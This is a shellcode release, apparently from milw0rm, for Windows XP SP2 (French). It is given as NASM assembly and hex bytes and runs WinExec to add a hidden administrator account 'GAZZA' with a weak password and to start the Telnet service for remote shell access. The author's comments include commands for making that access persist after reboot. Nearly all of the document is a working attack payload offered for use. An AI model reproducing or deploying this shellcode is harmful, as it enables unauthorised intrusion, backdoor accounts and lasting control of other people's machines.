; payload:add admin acount & Telnet Listening
; Author: DATA_SNIPER
; size:111 bytes
; platform:WIN32/XP SP2 FR
; thanks:Arab4services team & AT4RE Team
; more info: visit my blog http://datasniper.arab4services.net
; The Sh3llcode:
; "\xEB\x08\xBA\x4D\x11\x86\x7C\xFF\xD2\xCC\xE8\xF3\xFF\xFF\xFF\x63\x6D\x64\x20\x2F\x63"
; "\x20\x6E\x65\x74\x20\x75\x73\x65\x72\x20\x68\x69\x6C\x6C\x20\x31\x32\x33\x34\x35"
; "\x36\x20\x2F\x41\x44\x44\x20\x26\x26\x20\x6E\x65\x74\x20\x6C\x6F\x63\x61\x6C\x67"
; "\x72\x6F\x75\x70\x20\x41\x64\x6D\x69\x6E\x69\x73\x74\x72\x61\x74\x65\x75\x72\x73"
; "\x20\x68\x69\x6C\x6C\x20\x2F\x41\x44\x44\x20\x26\x26\x20\x73\x63\x20\x73\x74\x61"
; "\x72\x74\x20\x54\x6C\x6E\x74\x53\x76\x72\x00"
; Description: it's simular to TCP BindShell on port 23,throught Command execution we can get shell access throught telnet service on Windows b0x.
; Add admin account command user=GAZZA ,pass=123456 :cmd /c net user GAZZA 123456 /ADD && net localgroup Administrateurs GAZZA /ADD
; Start telnet service: sc start TlntSvr
; For saving ur access to the B0x again and again :),u can use this command:
; "sc config TlntSvr start= auto &  sc start TlntSvr" instead of:
; "sc start TlntSvr"
; NASM -s -fbin telnetbind.asm
BITS 32
db 0EBh,08h    ;such as "jmp Data" ,i puted it in opcode format for avoiding null problem.
Exec:
MOV EDX,7C86114Dh ;WinExec addr in WIN XP SP2 FR
CALL EDX
INT3 ;just interrupter (hung the shellcode after it do his job,any way u can use ExitProcess) for avoiding infinite loop
Data:
CALL Exec
db 'cmd /c net user GAZZA 123456 /ADD & net localgroup Administrateurs GAZZA /ADD & sc start TlntSvr',00h
;add user GAZA with 123456 password and start telnet service ;BTW the exstension cuted for saving som byte ;)

; milw0rm.com [2009-02-27]